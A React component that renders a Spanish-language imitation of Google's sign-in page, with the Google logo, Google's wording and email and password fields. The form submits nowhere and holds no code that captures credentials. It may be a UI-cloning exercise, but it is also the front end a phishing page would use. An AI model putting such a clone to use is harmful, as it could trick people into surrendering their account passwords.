import React from 'react';
import './theme/style.css';
import logo from './theme/google.png';
import TextField from '@material-ui/core/TextField';




function App() {
  
  return (
    
    <div className="maindiv" style={{ width:448, height:550}}>
     <img src={logo} alt="Google"/>
     <h1 style={{fontWeight:'bold',marginTop:20, marginBottom:15}}>Iniciar sesión</h1>
     <h3>Utiliza tu cuenta de Google</h3>
     <form action="">
     <div className="inputs" style={{marginTop:20}}>
       <div className="Fields" style={{width:'100%'}}>
         <div className="Fieldset">
         <TextField id="standard-basic" label="Correo electrónico o teléfono" variant='filled' style={{width:'100%'}} required />
         </div>
       </div>
       <div className="Fields" style={{width:'100%'}}>
         <div className="Fieldset" >
     
           <TextField id="standar-basic" label="Introduce tu contraseña" variant='filled' style={{width:'100%'}} type='Password' required />
         </div>
       </div>
     </div>
     <div style={{marginTop:-30,textAlign:'start'}}>
     <a href="#" style={{fontSize:13, fontWeight:
                        'bold', textDecoration:'none',
                        fontFamily: 'Noto Sans', 
                        color:'#1A73E7',
                        }}>¿Has olvidado tu correo electrónico?</a>
     </div>
    <div style={{textAlign:'start',marginTop:30, marginBottom:25}}>
    <p style={{fontSize:13, fontFamily:'Noto Sans'}}>¿No es tu ordenador? Usa el modo invitados para iniciar sesión de forma privada. <strong>Más información</strong></p>
    </div>
       <input type="submit" value="Iniciar Sesión" className='btn btn-primary'/>
       </form>
  
    </div>
  




  );
}


export default App;
